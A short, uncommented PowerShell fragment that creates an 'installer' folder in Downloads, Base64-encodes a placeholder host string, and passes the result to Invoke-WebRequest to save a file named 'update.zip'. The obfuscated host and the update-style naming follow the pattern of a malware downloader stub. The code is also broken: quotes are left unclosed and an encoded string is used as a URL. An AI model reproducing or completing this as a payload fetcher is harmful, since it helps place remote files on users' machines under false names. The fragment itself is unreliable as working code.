$pth = "C:\Users\user\Downloads\installer

New-Item -Path $pth -ItemType Directory

$ip = "ip here"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($ip)
$encoded = [Convert]::ToBase64String($bytes)
$encoded

Invoke-WebRequest -Uri  $encoded -OutFile "C:\Users\user\Downloads\installer\update.zip
